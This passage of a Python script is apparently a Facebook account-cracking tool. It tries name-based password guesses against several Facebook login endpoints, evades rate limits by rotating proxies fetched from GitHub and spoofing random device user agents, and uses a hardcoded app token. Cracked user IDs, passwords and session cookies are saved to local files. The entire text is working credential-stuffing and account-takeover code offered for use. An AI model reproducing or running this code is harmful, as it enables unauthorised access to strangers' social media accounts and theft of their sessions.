                                'Accept-Encoding': 'gzip, deflate',
                                'Connection': 'Keep-Alive'
                        }
                        url = 'https://graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url, data=data, headers=headers, allow_redirects=False, verify=True).json()
                        if 'access_token' in po:
                                coki = ";".join(i["name"] + "=" + i["value"] for i in po["session_cookies"])
                                print(f'\r\r {H}[SERK-M2-OK] {ids} | {pas}{P}')
                                open('/sdcard/SERK-OK.txt','a').write(ids+'\t'+pas+'\t'+coki+'\n')
                                oks.append(ids)
                                break
                        elif twf in str(po):
                                if 'y' in pcp:
                                        print(f'\r\r {U}[SERK-M2-2F] {ids} | {pas}{P}')
                                break
                        elif 'www.facebook.com' in po['error']['message']:
                                if 'y' in pcp:
                                        print(f'\r\r {C}[SERK-M2-CP] {ids} | {pas}{P}')
                                open('/sdcard/SERK-CP.txt','a').write(ids+'|'+pas+'\n')
                                cps.append(ids)
                                break
                        else:
                                continue
                loop+=1
        except Exception as e:
                pass
#============================= method=======================================                
#============================= basic=======================================                
def nxn3(ids, names, passlist):
    global loop
    global oks
    sys.stdout.write(f'\r\r{H} [SERK-M3] %s|{H}OK:-%s {H}' % (loop, len(oks)))
    sys.stdout.flush()
    
    # --- Fetch live proxies from GitHub ---
    try:
        url = "https://raw.githubusercontent.com/MAHDI-143/proxy-checker/main/proxies.txt"
        response = requests.get(url, timeout=10)
        raw_list = response.text.strip().split('\n')
        WORKING_PROXIES = [f"http://{p}" for p in raw_list if ':' in p and not p.startswith('#') and not p.startswith('socks')]
    except:
        WORKING_PROXIES = [
            'http://152.32.132.190:7890',
            'http://72.11.150.178:6005',
            'http://20.164.75.153:8080',
        ]
    
    try:
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            
            ua = random.choice(ugen)
            ua2 = random.choice(ugen)
            
            # Try up to 3 different proxies before giving up
            for attempt in range(3):
                ses = requests.Session()
                proxy_url = random.choice(WORKING_PROXIES)
                proxies = {'http': proxy_url, 'https': proxy_url}
                
                try:
                    # Step 1: GET
                    ses.headers.update({
                        "Host": "m.facebook.com",
                        "upgrade-insecure-requests": "1",
                        "user-agent": ua2,
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                        "x-requested-with": "mark.via.gp",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-dest": "document",
                        "referer": "https://m.facebook.com/",
                        "accept-encoding": "gzip, deflate",
                        "accept-language": "en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7"
                    })
                    
                    p = ses.get('https://m.facebook.com/login/device-based/password/?uid=' + ids + '&flow=login_no_pin&refsrc=deprecated&_rdr',
                               proxies=proxies, timeout=15)
                    
                    lsd = re.search('name="lsd" value="(.*?)"', str(p.text))
                    jazoest = re.search('name="jazoest" value="(.*?)"', str(p.text))
                    if not lsd or not jazoest:
                        break
                    
                    lsd = lsd.group(1)
                    jazoest = jazoest.group(1)
                    
                    # Step 2: POST
                    dataa = {
                        "lsd": lsd,
                        "jazoest": jazoest,
                        "uid": ids,
                        "next": "https://p.facebook.com/login/save-device/",
                        "flow": "login_no_pin",
                        "pass": pas
                    }
                    
                    koki = ";".join(["%s=%s" % (key, value) for key, value in p.cookies.get_dict().items()])
                    koki += ' m_pixel_ratio=2.625; wd=412x756'
                    
                    heade = {
                        'Host': 'm.facebook.com',
                        'viewport-width': '980',
                        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
                        'sec-ch-ua-mobile': '?1',
                        'sec-ch-ua-platform': '"Android"',
                        'upgrade-insecure-requests': '1',
                        'user-agent': ua,
                        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                        'sec-fetch-site': 'same-origin',
                        'sec-fetch-mode': 'navigate',
                        'sec-fetch-user': '?1',
                        'sec-fetch-dest': 'document',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9,bn-BD;q=0.8,bn;q=0.7',
                        'dpr': str(round(random.uniform(2.0, 3.0), 1)),
                    }
                    
                    po = ses.post(
                        'https://m.facebook.com/login/device-based/validate-password/?shbl=0',
                        data=dataa,
                        cookies={'cookie': koki},
                        headers=heade,
                        proxies=proxies,
                        allow_redirects=False,
                        timeout=15
                    )
                    
                    if "checkpoint" in po.cookies.get_dict().keys():
                        if 'y' in pcp:
                            print(f'\r\r {C}[SERK-M3-CP] {ids} | {pas}{P}')
                        open('/sdcard/SERK-M3-CP.txt', 'a').write(ids + '|' + pas + '\n')
                        cps.append(ids)
                        break
                        
                    elif "c_user" in ses.cookies.get_dict().keys():
                        coki = po.cookies.get_dict()
                        kuki = ";".join(["%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items()])
                        print(f'\r\r {H}[SERK-M3-OK] {ids} | {pas} | PROXY: {proxy_url}{P}')
                        open('/sdcard/SERK-M3-COOKIE.txt', 'a').write(ids + '|' + pas + ' | ' + kuki + '\n')
                        open('/sdcard/SERK-M3-OK.txt', 'a').write(ids + '|' + pas + '\n')
                        oks.append(ids)
                        break
                    else:
                        break
                        
                except (requests.exceptions.ConnectionError, requests.exceptions.ProxyError):
                    continue
                    
            loop += 1
            
    except Exception as e:
        pass
                        
def rndm(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [SERK] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
                        fbbv = str(random.randint(111111111,999999999))
                        android_version = device['android_version']
                        model = device['model']
                        build = device['build']
                        fblc = device['fblc']
                        fbcr = sim_id
                        fbmf = device['fbmf']
                        fbbd = device['fbbd']
                        fbdv = device['fbdv']
                        fbsv = device['fbsv']
                        fbca = device['fbca']
                        fbdm = device['fbdm']
                        fbfw = '1'
                        fbrv = '0'
                        fban = 'FB4A'
                        fbpn = 'com.facebook.katana'
                        en = random.choice(['en_US','en_GB'])
                        motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
                        mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
                        mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
                        bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
                        mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
                        cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
                        network = random.choice(['Zong','null','Marshmallow','Telekom China'])
                        ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,313)) +";FBBV/"+str(random.randint(11111111,77777777))+"[FBAN/FB4A;FBAV/22.0.0.2958;FBBV/5410079;[FBAN/FB4A;FBAV/406.0.0.26.90;FBBV/456153944;FBDM/{density=1.875,width=720,height=1465};FBLC/pt_BR;FBRV/457886897;FBCR/CLARO BR;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A035M;FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'+'[FBAN/1.8.4;FBDM/% ity=0.75,width=320,height=240};FBLC/es_AR;FB_FW/1;FBCR/CLARO;FBPN/com.facebook.katana;FB FBSV/2.1-update1;]','[FBAN/59.0.0.13.313;FBBV/19955371;FBDM/{density=1.0,width=800,height=1280};FBLC/en_US;FBCR/null;FBMF/Amazon;FBBD/Amazon;FBPN/KFMUWI;FBSV/4.4.2;nullFBCA/x86:armeabi-v7a;]','[FBAN/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=854};FBLC/ru_RU;FBCR/Bezlimit;FBMF/Xiaomi;FBBD/Redmi;FBPN/Redmi 6 Pro Extreme;FBSV/4.2.2;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/61.0.0.15.69;FBBV/20748118;FBDM/{density=3.5,width=1440,height=2560};FBLC/es_LA;FBCR/MOVISTAR;FBMF/Rockchip;FBBD/K5-3G;FBPN/K5-3G;FBSV/5.1.1;nullFBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20454129;FBDM/{density=3.5,width=1440,height=2560};FBLC/U.S. Cellular;FBMF/SM-N920R4;FBSV/armeabi-v7a:armeabi;]" 
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        secure = str(uuid.uuid4())
                        family = str(uuid.uuid4())
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
                        sm=['GT-', 'SM-']
                        sim_serials = f'["{xd}"]'
                        li = ['28','29','210']
                        li2 = random.choice(li)
                        j1 = ''.join(random.choice(digits) for _ in range(2))
                        jazoest = li2+j1
                        data = {'adid':str(uuid.uuid4()),'format':'json','device_id':str(uuid.uuid4()),'email':ids,'password':pas,'generate_analytics_claims':'1','community_id':'','cpl':'true','try_num':'1','family_device_id':str(uuid.uuid4()),'credentials_type':'password','source':'login','error_detail_type':'button_with_disabled','enroll_misauth':'false','generate_session_cookies':'1','generate_machine_id':'1','currently_logged_in_userid':'0','locale': 'en_US','client_country_code': 'US','fb_api_req_friendly_name':'authenticate','api_key':'62f8ce9f74b12f84c123cc23437a4a32','access_token':accees_token}
                        headers=  {'User-Agent': ua, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'Keep-Alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=data,headers=headers).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print('\r\r\033[1;32m [SERK-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/SERK.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/SERK-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                    #    print('\r\r\x1b[1;31m [SERK-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SERK-rnd-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except requests.exceptions.ConnectionError:
                time.sleep(20)        
        except Exception as e:
                pass

menu()
